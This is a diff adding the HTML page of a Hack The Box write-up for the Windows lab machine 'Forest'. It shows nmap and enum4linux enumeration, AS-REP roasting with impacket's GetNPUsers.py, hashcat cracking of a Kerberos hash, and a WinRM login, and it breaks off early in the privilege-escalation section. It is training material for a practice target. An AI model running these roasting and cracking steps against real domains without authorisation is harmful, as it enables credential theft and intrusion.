@@ -1,0 +1,541 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="Adopt the pace of nature!">
+    <meta name="author" content="Sabe Barker">
+
+    <title>Forest - Hack The Box · Sabe Barker</title>
+
+    <link rel="canonical" href="https://sabebarker.com/writeups/hackthebox/machines/forest/">
+
+    <!-- Bootstrap core CSS -->
+    <link href="/assets/css/bootstrap.min.css" rel="stylesheet">
+	<!-- Custom CSS -->
+    <link href="/assets/css/sabe.css" rel="stylesheet">
+    <!-- Lightbox -->
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/ekko-lightbox/5.3.0/ekko-lightbox.css" rel="stylesheet">
+    <!-- Favicons -->
+	<link rel="apple-touch-icon" href="/assets/img/favicons/apple-touch-icon.png" sizes="180x180">
+	<link rel="icon" href="/assets/img/favicons/favicon-32x32.png" sizes="32x32" type="image/png">
+	<link rel="icon" href="/assets/img/favicons/favicon-16x16.png" sizes="16x16" type="image/png">
+	<link rel="manifest" href="/assets/img/favicons/manifest.json">
+	<link rel="mask-icon" href="/assets/img/favicons/safari-pinned-tab.svg" color="#8248f6">
+	<link rel="icon" href="/assets/img/favicons/favicon.ico">
+	<meta name="apple-mobile-web-app-title" content="Sabe Barker">
+	<meta name="application-name" content="Sabe Barker">
+	<meta name="msapplication-TileColor" content="#fff">
+	<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
+	<meta name="theme-color" content="#fff">
+	
+    <!-- Twitter -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:site" content="@sabebarker">
+    <meta name="twitter:creator" content="@sabebarker">
+    <meta name="twitter:title" content="Forest - Hack The Box · Sabe Barker">
+    <meta name="twitter:description" content="Adopt the pace of nature!">
+    <meta name="twitter:image" content="https://sabebarker.com/assets/img/writeups/hackthebox/machines/forest/forest_infocard.png">
+
+    <!-- Facebook -->
+    <meta property="og:url" content="https://sabebarker.com/writeups/hackthebox/machines/forest/" />
+    <meta property="og:title" content="Forest - Hack The Box · Sabe Barker">
+    <meta property="og:description" content="Adopt the pace of nature!">
+    <meta property="og:type" content="website">
+    <meta property="og:image" content="https://sabebarker.com/assets/img/writeups/hackthebox/machines/forest/forest_infocard.png">
+    <meta property="og:image:secure_url" content="https://sabebarker.com/assets/img/writeups/hackthebox/machines/forest/forest_infocard.png">
+    <meta property="og:image:type" content="image/png">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+	<script async src="https://www.googletagmanager.com/gtag/js?id=UA-151243373-1"></script>
+	<script>
+  		window.dataLayer = window.dataLayer || [];
+  		function gtag(){dataLayer.push(arguments);}
+  		gtag('js', new Date());
+
+  		gtag('config', 'UA-151243373-1');
+	</script>
+  </head>
+  <body>
+    <a class="skippy sr-only sr-only-focusable" href="#content">
+      <span class="skippy-text">Skip to main content</span>
+    </a>
+
+    <header class="navbar navbar-expand navbar-light flex-column flex-md-row sb-navbar">
+      <a class="navbar-brand mr-0 mr-md-2" href="/" aria-label="Sabe Barker"><svg id="Layer_35" enable-background="new 0 0 64 64" height="36" viewBox="0 0 64 64" width="36" class="d-inline-block align-top" style="margin-right: 10px;" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><linearGradient id="SVGID_1_" gradientUnits="userSpaceOnUse" x1="32" x2="32" y1="63" y2="1"><stop offset="0" stop-color="#9f2fff"/><stop offset="1" stop-color="#0bb1d3"/></linearGradient><path d="m42.363 39.397 1.596 1.205c-.446.59-.85 1.22-1.202 1.872l-1.761-.949c.4-.742.86-1.458 1.367-2.128zm.887-1.079 1.5 1.322c1.863-2.112 3.182-4.677 3.814-7.416l-1.949-.45c-.557 2.417-1.721 4.68-3.365 6.544zm-4.689-23.805.878-1.797c-2.33-1.139-4.833-1.716-7.439-1.716s-5.109.577-7.439 1.716l.878 1.797c4.108-2.008 9.014-2.008 13.122 0zm14.439 13.487v.396c0 5.149-1.884 10.104-5.304 13.952-1.738 1.956-2.696 4.473-2.696 7.09v.562c0 3.859-3.14 7-7 7h-12c-3.86 0-7-3.141-7-7v-.562c0-2.616-.958-5.134-2.696-7.09-3.42-3.848-5.304-8.803-5.304-13.952v-.396c0-11.58 9.42-21 21-21s21 9.42 21 21zm-2 0c0-10.477-8.523-19-19-19s-19 8.523-19 19v.396c0 4.659 1.705 9.142 4.799 12.624 2.064 2.321 3.201 5.311 3.201 8.418v.562c0 2.757 2.243 5 5 5h12c2.757 0 5-2.243 5-5v-.562c0-3.106 1.137-6.097 3.201-8.418 3.094-3.482 4.799-7.965 4.799-12.624zm-10 18v4c0 1.654-1.346 3-3 3h-12c-1.654 0-3-1.346-3-3v-4c0-1.654 1.346-3 3-3h12c1.654 0 3 1.346 3 3zm-3-1h-1v2h2v-1c0-.552-.449-1-1-1zm-9 4v2h2v-2zm2-2v-2h-2v2zm2 4h2v-2h-2zm2-4v-2h-2v2zm-10-1v1h2v-2h-1c-.551 0-1 .448-1 1zm1 5h1v-2h-2v1c0 .552.449 1 1 1zm13-1v-1h-2v2h1c.551 0 1-.448 1-1zm-8.618-19h3.236l2.105 4.211c.181.361.277.767.277 1.171 0 1.443-1.174 2.618-2.618 2.618h-2.764c-1.444 0-2.618-1.175-2.618-2.618 0-.404.096-.81.276-1.171zm1.236 2-1.553 3.105c-.043.085-.065.181-.065.277 0 .341.277.618.618.618h2.764c.341 0 .618-.277.618-.618 0-.096-.022-.191-.065-.276l-1.553-3.106zm14.089-16.293-1.218 1.218c2.149 1.225 3.511 3.509 3.511 6.075 0 3.86-3.14 7-7 7-3.067 0-5.987-1.962-6.943-4.667l-.21-.595 10.446-10.446zm-2.708 2.709-6.809 6.809c.862 1.616 2.821 2.775 4.81 2.775 2.757 0 5-2.243 5-5 0-1.989-1.209-3.798-3.001-4.584zm-19.999 11.584c-3.86 0-7-3.14-7-7 0-2.567 1.362-4.851 3.511-6.075l-1.218-1.218 1.414-1.414 10.446 10.446-.21.595c-.956 2.704-3.876 4.666-6.943 4.666zm0-2c1.989 0 3.948-1.159 4.811-2.775l-6.809-6.809c-1.793.786-3.002 2.595-3.002 4.584 0 2.757 2.243 5 5 5zm-14.098-17.676 1.49 1.334c5.498-6.138 13.374-9.658 21.608-9.658v-2c-8.802 0-17.221 3.763-23.098 10.324zm23.098 49.676v2c9.308 0 18.04-4.128 23.958-11.325l-1.545-1.27c-5.537 6.734-13.706 10.595-22.413 10.595zm-28.969-27.649c.032.688.088 1.383.168 2.062l1.986-.232c-.074-.634-.127-1.28-.156-1.922zm4.132 9.256c-.252-.592-.486-1.196-.693-1.799l-1.891.652c.223.646.474 1.297.745 1.932zm-1.256-3.643c-.164-.615-.309-1.247-.429-1.879l-1.965.375c.129.679.285 1.358.461 2.02zm52.186-13.928c.165.617.309 1.249.429 1.879l1.965-.375c-.129-.677-.284-1.356-.461-2.02zm2.876 5.613c-.032-.689-.088-1.383-.168-2.063l-1.986.233c.074.633.127 1.28.156 1.922zm-4.132-9.256c.252.589.485 1.194.694 1.798l1.891-.652c-.224-.65-.475-1.3-.746-1.932zm6.163 21.607c0 1.654-1.346 3-3 3-.117 0-.228-.021-.342-.035-.628 1.241-1.323 2.455-2.112 3.602l-1.647-1.135c.733-1.063 1.377-2.189 1.96-3.338-.53-.541-.859-1.279-.859-2.094 0-1.654 1.346-3 3-3s3 1.346 3 3zm-2 0c0-.552-.449-1-1-1s-1 .448-1 1 .449 1 1 1 1-.448 1-1zm-52.199-28.404c-1.014 1.35-1.904 2.795-2.668 4.299.535.542.867 1.285.867 2.105 0 1.654-1.346 3-3 3s-3-1.346-3-3 1.346-3 3-3c.112 0 .219.021.328.033.821-1.623 1.779-3.183 2.874-4.639zm-3.801 6.404c0-.551-.449-1-1-1s-1 .449-1 1 .449 1 1 1 1-.449 1-1z" fill="url(#SVGID_1_)"/></svg>{ sabebarker }
+      </a>
+
+      <div class="navbar-nav-scroll">
+        <ul class="navbar-nav sb-navbar-nav flex-row">
+          <li class="nav-item">
+            <a class="nav-link " href="/search">
+        <svg height="15" class="octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search" viewBox="0 0 16 16" version="1.1" width="15" aria-hidden="true"><path fill-rule="evenodd" d="M15.7 13.3l-3.81-3.83A5.93 5.93 0 0013 6c0-3.31-2.69-6-6-6S1 2.69 1 6s2.69 6 6 6c1.3 0 2.48-.41 3.47-1.11l3.83 3.81c.19.2.45.3.7.3.25 0 .52-.09.7-.3a.996.996 0 000-1.41v.01zM7 10.7c-2.59 0-4.7-2.11-4.7-4.7 0-2.59 2.11-4.7 4.7-4.7 2.59 0 4.7 2.11 4.7 4.7 0 2.59-2.11 4.7-4.7 4.7z"/></svg>
+      </a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link " href="/">
+	      Home
+	     </a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link " href="/blog">
+	      Blog
+	    </a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link active" href="/writeups">
+	      Writeups
+	    </a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link " href="/tools">
+	      Tools
+	    </a>
+          </li>
+        </ul>
+      </div>
+
+      <ul class="navbar-nav flex-row ml-md-auto d-none d-md-flex">
+        <li class="nav-item">
+          <a class="nav-link p-2" href="https://github.com/sabebarker" target="_blank" rel="noopener" aria-label="GitHub"><svg xmlns="http://www.w3.org/2000/svg" class="navbar-nav-svg" viewBox="0 0 512 499.36" role="img" focusable="false"><title>GitHub</title><path fill="currentColor" fill-rule="evenodd" d="M256 0C114.64 0 0 114.61 0 256c0 113.09 73.34 209 175.08 242.9 12.8 2.35 17.47-5.56 17.47-12.34 0-6.08-.22-22.18-.35-43.54-71.2 15.49-86.2-34.34-86.2-34.34-11.64-29.57-28.42-37.45-28.42-37.45-23.27-15.84 1.73-15.55 1.73-15.55 25.69 1.81 39.21 26.38 39.21 26.38 22.84 39.12 59.92 27.82 74.5 21.27 2.33-16.54 8.94-27.82 16.25-34.22-56.84-6.43-116.6-28.43-116.6-126.49 0-27.95 10-50.8 26.35-68.69-2.63-6.48-11.42-32.5 2.51-67.75 0 0 21.49-6.88 70.4 26.24a242.65 242.65 0 0 1 128.18 0c48.87-33.13 70.33-26.24 70.33-26.24 14 35.25 5.18 61.27 2.55 67.75 16.41 17.9 26.31 40.75 26.31 68.69 0 98.35-59.85 120-116.88 126.32 9.19 7.9 17.38 23.53 17.38 47.41 0 34.22-.31 61.83-.31 70.23 0 6.85 4.61 14.81 17.6 12.31C438.72 464.97 512 369.08 512 256.02 512 114.62 397.37 0 256 0z"/></svg></a>
+       </li>
+       <li class="nav-item">
+         <a class="nav-link p-2" href="https://twitter.com/sabebarker" target="_blank" rel="noopener" aria-label="Twitter"><svg xmlns="http://www.w3.org/2000/svg" class="navbar-nav-svg" viewBox="0 0 512 416.32" role="img" focusable="false"><title>Twitter</title><path fill="currentColor" d="M160.83 416.32c193.2 0 298.92-160.22 298.92-298.92 0-4.51 0-9-.2-13.52A214 214 0 0 0 512 49.38a212.93 212.93 0 0 1-60.44 16.6 105.7 105.7 0 0 0 46.3-58.19 209 209 0 0 1-66.79 25.37 105.09 105.09 0 0 0-181.73 71.91 116.12 116.12 0 0 0 2.66 24c-87.28-4.3-164.73-46.3-216.56-109.82A105.48 105.48 0 0 0 68 159.6a106.27 106.27 0 0 1-47.53-13.11v1.43a105.28 105.28 0 0 0 84.21 103.06 105.67 105.67 0 0 1-47.33 1.84 105.06 105.06 0 0 0 98.14 72.94A210.72 210.72 0 0 1 25 370.84a202.17 202.17 0 0 1-25-1.43 298.85 298.85 0 0 0 160.83 46.92"/></svg></a>
+       </li>
+       <li class="nav-item">
+         <a class="nav-link p-2" href="https://facebook.com/sabebarker2600" target="_blank" rel="noopener" aria-label="Facebook"><svg xmlns="http://www.w3.org/2000/svg" class="navbar-nav-svg" viewBox="0 0 24 24" role="img" focusable="false"><title>Facebook</title><path fill="currentColor" d="M210.787 234.832l68.31-22.883 22.1 65.977-68.309 22.882z"/><path fill="currentColor" d="M23.9981 11.9991C23.9981 5.37216 18.626 0 11.9991 0C5.37216 0 0 5.37216 0 11.9991C0 17.9882 4.38789 22.9522 10.1242 23.8524V15.4676H7.07758V11.9991H10.1242V9.35553C10.1242 6.34826 11.9156 4.68714 14.6564 4.68714C15.9692 4.68714 17.3424 4.92149 17.3424 4.92149V7.87439H15.8294C14.3388 7.87439 13.8739 8.79933 13.8739 9.74824V11.9991H17.2018L16.6698 15.4676H13.8739V23.8524C19.6103 22.9522 23.9981 17.9882 23.9981 11.9991Z"/></svg></a>
+       </li>
+      </ul>
+    </header>
+
+
+    <div class="container-fluid">
+      <div class="row flex-xl-nowrap">
+        <div class="col-12 col-md-3 col-xl-2 sb-sidebar">
+          <button class="btn btn-link sb-search-docs-toggle d-md-none p-0 ml-3" type="button" data-toggle="collapse" data-target="#sb-docs-nav" aria-controls="sb-docs-nav" aria-expanded="false" aria-label="Toggle docs navigation"><svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" viewBox="0 0 30 30" role="img" focusable="false"><title>Menu</title><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"/></svg></button>
+
+<nav class="collapse sb-links" id="sb-docs-nav"><div class="sb-toc-item">
+      <a class="sb-toc-link" href="/writeups/hackthebox/getting-started/introduction/">
+        Getting Started
+      </a>
+
+      <ul class="nav sb-sidenav"><li>
+            <a href="/writeups/hackthebox/getting-started/introduction/">
+              Introduction
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/getting-started/basic-setup/">
+              Basic Setup
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/getting-started/vpn-setup/">
+              VPN Setup
+            </a>
+          </li></ul>
+    </div><div class="sb-toc-item active">
+      <a class="sb-toc-link" href="/writeups/hackthebox/machines/nest/">
+        Machines
+      </a>
+
+      <ul class="nav sb-sidenav"><li>
+            <a href="/writeups/hackthebox/machines/nest/">
+              Nest
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/machines/resolute/">
+              Resolute
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/machines/obscurity/">
+              Obscurity
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/machines/openadmin/">
+              OpenAdmin
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/machines/mango/">
+              Mango
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/machines/traverxec/">
+              Traverxec
+            </a>
+          </li><li class="active sb-sidenav-active">
+            <a href="/writeups/hackthebox/machines/forest/">
+              Forest
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/machines/postman/">
+              Postman
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/machines/scavenger/">
+              Scavenger
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/machines/json/">
+              Json
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/machines/ai/">
+              AI
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/machines/bitlab/">
+              Bitlab
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/machines/craft/">
+              Craft
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/machines/networked/">
+              Networked
+            </a>
+          </li></ul>
+    </div></nav>
+        </div>
+
+        
+          <div class="d-none d-xl-block col-xl-2 sb-toc">
+            <ul class="section-nav">
+<li class="toc-entry toc-h2"><a href="#enumeration">Enumeration</a>
+<ul>
+<li class="toc-entry toc-h3"><a href="#portscan">Portscan</a></li>
+<li class="toc-entry toc-h3"><a href="#enum4linux">Enum4Linux</a></li>
+</ul>
+</li>
+<li class="toc-entry toc-h2"><a href="#user">User</a></li>
+<li class="toc-entry toc-h2"><a href="#root">Root</a></li>
+<li class="toc-entry toc-h2"><a href="#conclusion">Conclusion</a></li>
+</ul>
+          </div>
+        
+
+        <main class="col-12 col-md-9 col-xl-8 py-md-3 pl-md-5 sb-content" role="main">
+          <h1 class="sb-title" id="content">Forest</h1>
+          <p class="sb-lead">Adopt the pace of nature!</p>
+          <p class="text-center"><img src="/assets/img/writeups/hackthebox/machines/forest/forest_infocard.png" alt="HackTheBox Forest Machine Info Card" class="img-fluid" /></p>
+
+<p><strong>Forest</strong> is an easy difficulty machine running Windows. It tests your knowledge in <em>Basic enumeration and privelege escalation</em> using common commands as well as using tools such as <em>Bloodhound</em>.</p>
+
+<p>Be sure to checkout the <a href="/writeups/hackthebox/getting-started/basic-setup/">Basic Setup</a> section  before you get started.</p>
+
+<h2 id="enumeration">Enumeration</h2>
+
+<p>Like always, enumeration is our first port of call. Let’s take a look at the machine and see what we are dealing with.</p>
+
+<h3 id="portscan">Portscan</h3>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">portscan forest.htb
+Grabbing ports...
+Ports grabbed!
+Scanning...
+Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2019-11-07 14:53 GMT
+Nmap scan report <span class="k">for </span>forest.htb <span class="o">(</span>10.10.10.161<span class="o">)</span>
+Host is up <span class="o">(</span>0.37s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT      STATE SERVICE      VERSION
+53/tcp    open  domain?
+| fingerprint-strings: 
+|   DNSVersionBindReqTCP: 
+|     version
+|_    <span class="nb">bind
+</span>88/tcp    open  kerberos-sec Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2019-11-07 07:00:32Z<span class="o">)</span>
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp   open  ldap         Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: htb.local, Site: Default-First-Site-Name<span class="o">)</span>
+445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds <span class="o">(</span>workgroup: HTB<span class="o">)</span>
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: htb.local, Site: Default-First-Site-Name<span class="o">)</span>
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf       .NET Message Framing
+47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc        Microsoft Windows RPC
+49665/tcp open  msrpc        Microsoft Windows RPC
+49666/tcp open  msrpc        Microsoft Windows RPC
+49667/tcp open  msrpc        Microsoft Windows RPC
+49671/tcp open  msrpc        Microsoft Windows RPC
+49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+49677/tcp open  msrpc        Microsoft Windows RPC
+49684/tcp open  msrpc        Microsoft Windows RPC
+49695/tcp open  msrpc        Microsoft Windows RPC
+49714/tcp open  msrpc        Microsoft Windows RPC
+Service Info: Host: FOREST<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: <span class="nt">-5h13m08s</span>, deviation: 4h37m12s, median: <span class="nt">-7h53m11s</span>
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard 14393 <span class="o">(</span>Windows Server 2016 Standard 6.3<span class="o">)</span>
+|   Computer name: FOREST
+|   NetBIOS computer name: FOREST<span class="se">\x</span>00
+|   Domain name: htb.local
+|   Forest name: htb.local
+|   FQDN: FOREST.htb.local
+|_  System <span class="nb">time</span>: 2019-11-06T23:03:07-08:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   <span class="nb">date</span>: 2019-11-07T07:03:05
+|_  start_date: 2019-11-07T06:39:53
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>300.76 seconds</code></pre></figure>
+
+<p>From our scan we can see a few things that may be of interest. We have SMB, Kerberos and WinRM which can all be useful in us gaining access.</p>
+
+<h3 id="enum4linux">Enum4Linux</h3>
+
+<p>Let’s see if we can grab any useful info:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">enum4linux forest.htb <span class="o">&gt;</span> enum4linux.txt</code></pre></figure>
+
+<p>We can then check to see if we have found any users:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">cat </span>enum4linux.txt | <span class="nb">grep</span> <span class="nt">-i</span> <span class="nb">users</span>
+.... SNIP ....		.... SNIP ....		.... SNIP ....		.... SNIP ....
+enum4linux.txt:Group <span class="s1">'Domain Users'</span> <span class="o">(</span>RID: 513<span class="o">)</span> has member: HTB<span class="se">\A</span>dministrator
+enum4linux.txt:Group <span class="s1">'Domain Users'</span> <span class="o">(</span>RID: 513<span class="o">)</span> has member: HTB<span class="se">\D</span>efaultAccount
+enum4linux.txt:Group <span class="s1">'Domain Users'</span> <span class="o">(</span>RID: 513<span class="o">)</span> has member: HTB<span class="se">\k</span>rbtgt
+.... SNIP ....		.... SNIP ....		.... SNIP ....		.... SNIP ....
+enum4linux.txt:Group <span class="s1">'Domain Users'</span> <span class="o">(</span>RID: 513<span class="o">)</span> has member: HTB<span class="se">\s</span>ebastien
+enum4linux.txt:Group <span class="s1">'Domain Users'</span> <span class="o">(</span>RID: 513<span class="o">)</span> has member: HTB<span class="se">\l</span>ucinda
+enum4linux.txt:Group <span class="s1">'Domain Users'</span> <span class="o">(</span>RID: 513<span class="o">)</span> has member: HTB<span class="se">\s</span>vc-alfresco
+enum4linux.txt:Group <span class="s1">'Domain Users'</span> <span class="o">(</span>RID: 513<span class="o">)</span> has member: HTB<span class="se">\a</span>ndy
+enum4linux.txt:Group <span class="s1">'Domain Users'</span> <span class="o">(</span>RID: 513<span class="o">)</span> has member: HTB<span class="se">\m</span>ark
+enum4linux.txt:Group <span class="s1">'Domain Users'</span> <span class="o">(</span>RID: 513<span class="o">)</span> has member: HTB<span class="se">\s</span>anti</code></pre></figure>
+
+<p>Looks like we have found a few… Nice! Let’s make a list of just the usernames and all the other junk taken out.</p>
+
+<h2 id="user">User</h2>
+
+<p>Since we have usernames but we don’t have any passwords let’s see if any of the users are set without <em>Kerberos</em> pre-authentication required. This is called ASREPRoasting and we will use one of <a href="https://github.com/SecureAuthCorp/impacket">impackets</a> examples for this:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">GetNPUsers.py <span class="nt">-dc-ip</span> 10.10.10.161 htb.local/ <span class="nt">-usersfile</span> usernames.txt <span class="nt">-format</span> hashcat <span class="nt">-outputfile</span> hashes.asreproast</code></pre></figure>
+
+<p>Checking our output file we see that we have grabbed a hash:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">cat </span>hashes.asreproast
+<span class="nv">$krb5asrep$23$svc</span><span class="nt">-alfresco</span>@HTB.LOCAL:d36a3e9c1a66....fedc13432f1<span class="nv">$981ae7bbc66fa7e5b60ef5cbd49a1c66709cf03165607db827c1af40deae1f2d8470aac43a226907</span>
+2020340bdbd2e1e8752ee190cc3ef007aa8db1a0e4ad5871bf80f874b6add353ed0c87950c9e5ed2b3b9d9bb4a41862cc417f24ef109cd97d1fd79c2c4cea7751bd674d60bc772d31
+9ffac306c07c788bac33bba6021acd61ed849e0dcee....a58d61b36ffdf5c1127bb1c115b53c48071328d9bcd5cc9bf0dd021e56ff3fa2aa4e98a113b465982a127d60fa4960c0d3
+8d7b6e45975f95fbd45ccf....84f1ea0bf47473f8e3aac56518fc263c7407d67fb6bea4074b98c</code></pre></figure>
+
+<p>Let’s try and crack the hash:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">hashcat <span class="nt">-m</span> 18200 <span class="nt">--force</span> <span class="nt">-a</span> 0 hashes.asreproast /usr/share/wordlists/rockyou.txt 
+hashcat <span class="o">(</span>v5.1.0<span class="o">)</span> starting...
+
+OpenCL Platform <span class="c">#1: The pocl project</span>
+<span class="o">====================================</span>
+<span class="k">*</span> Device <span class="c">#1: pthread-Intel(R) Core(TM) i7-6800K CPU @ 3.40GHz, 2048/5918 MB allocatable, 4MCU</span>
+
+Dictionary cache built:
+<span class="k">*</span> Filename..: /usr/share/wordlists/rockyou.txt
+<span class="k">*</span> Passwords.: 14344392
+<span class="k">*</span> Bytes.....: 139921507
+<span class="k">*</span> Keyspace..: 14344385
+<span class="k">*</span> Runtime...: 6 secs
+
+<span class="nv">$krb5asrep$23$svc</span><span class="nt">-alfresco</span>@HTB.LOCAL:c32a238add6ade578c169b14a26203f5<span class="nv">$49f40b19377f04ea05fc9474c79e3e0242685fb533b0e2c7ad6e41b688221def0bcbf0caa7e</span>
+588c01e01132495dd8bc9ec3f5c3afba95bc891f64e18fcb666831f23a0bf2aff1860e36f1c06588ac89182b37980938d9b97a3876b7096434de2f08bc7b8885e974d5f6529dc9e0f
+fd174a6b23460d0e5c76ba2c2613506c1be1fbbf678464980af717d9fe576fe77310ff97442eb205e18a380b539199658b40246634714bad41808ff2e6542ac86a5e64b94073c1f4b
+40d83d6fe6d84dab9ecfed80a14301c935276f16db4d35f83f264a460450ab1d248e34bbc7d7904883ce4fd505d1ec0:s3....ce
+                                                 
+Session..........: hashcat
+Status...........: Cracked
+Hash.Type........: Kerberos 5 AS-REP etype 23
+Hash.Target......: <span class="nv">$krb5asrep$23$svc</span><span class="nt">-alfresco</span>@HTB.LOCAL:c32a238add6ade...5d1ec0
+Time.Started.....: Sun Nov 10 13:54:23 2019 <span class="o">(</span>8 secs<span class="o">)</span>
+Time.Estimated...: Sun Nov 10 13:54:31 2019 <span class="o">(</span>0 secs<span class="o">)</span>
+Guess.Base.......: File <span class="o">(</span>/usr/share/wordlists/rockyou.txt<span class="o">)</span>
+Guess.Queue......: 1/1 <span class="o">(</span>100.00%<span class="o">)</span>
+Speed.#1.........:   543.7 kH/s <span class="o">(</span>6.04ms<span class="o">)</span> @ Accel:32 Loops:1 Thr:64 Vec:8
+Recovered........: 1/1 <span class="o">(</span>100.00%<span class="o">)</span> Digests, 1/1 <span class="o">(</span>100.00%<span class="o">)</span> Salts
+Progress.........: 4087808/14344385 <span class="o">(</span>28.50%<span class="o">)</span>
+Rejected.........: 0/4087808 <span class="o">(</span>0.00%<span class="o">)</span>
+Restore.Point....: 4079616/14344385 <span class="o">(</span>28.44%<span class="o">)</span>
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidates.#1....: s9039554h -&gt; s2704081</code></pre></figure>
+
+<p>We have valid credentials! Let’s go see if we can login via <em>WinRM</em>:</p>
+
+<figure class="highlight"><pre><code class="language-posh" data-lang="posh"><span class="nf">PS</span><span class="w"> </span><span class="nx">htb\svc-alfresco</span><span class="err">@</span><span class="nx">FOREST</span><span class="w"> </span><span class="nx">Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">cat</span><span class="w"> </span><span class="o">..</span><span class="nx">/Desktop/user.txt</span><span class="w">
+</span><span class="nf">e5e4e47ae7....013fb0d9ed</span></code></pre></figure>
+
+<p>We have the <code class="highlighter-rouge">user.txt</code> flag. Let’s move on to <code class="highlighter-rouge">root</code>!</p>
+
+<h2 id="root">Root</h2>
+
+<p>Taking a look at the groups our user has we see that we have a couple of interest:</p>
+
+<figure class="highlight"><pre><code class="language-posh" data-lang="posh"><span class="nf">PS</span><span class="w"> </span><span class="nx">htb\svc-alfresco</span><span class="err">@</span><span class="nx">FOREST</span><span class="w"> </span><span class="nx">Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">whoami</span><span class="w"> </span><span class="nx">/groups</span><span class="w">
+
+</span><span class="nf">GROUP</span><span class="w"> </span><span class="nx">INFORMATION</span><span class="w">
+</span><span class="nf">-----------------</span><span class="w">
+
+</span><span class="nf">Group</span><span class="w"> </span><span class="nx">Name</span><span class="w">                    </span><span class="nx">Type</span><span class="w">             </span><span class="nx">SID</span><span class="w">                                           </span><span class="nx">Attributes</span><span class="w">                                        
+</span><span class="o">============================</span><span class="w"> </span><span class="o">======</span><span class="w"> </span><span class="o">=============================================</span><span class="w"> </span><span class="o">==================================================</span><span class="w">
+</span><span class="o">....</span><span class="w"> </span><span class="nf">SNIP</span><span class="w"> </span><span class="o">....</span><span class="w">		</span><span class="o">....</span><span class="w"> </span><span class="nx">SNIP</span><span class="w"> </span><span class="o">....</span><span class="w">		</span><span class="o">....</span><span class="w"> </span><span class="nx">SNIP</span><span class="w"> </span><span class="o">....</span><span class="w">		</span><span class="o">....</span><span class="w"> </span><span class="nx">SNIP</span><span class="w"> </span><span class="o">....</span><span class="w">
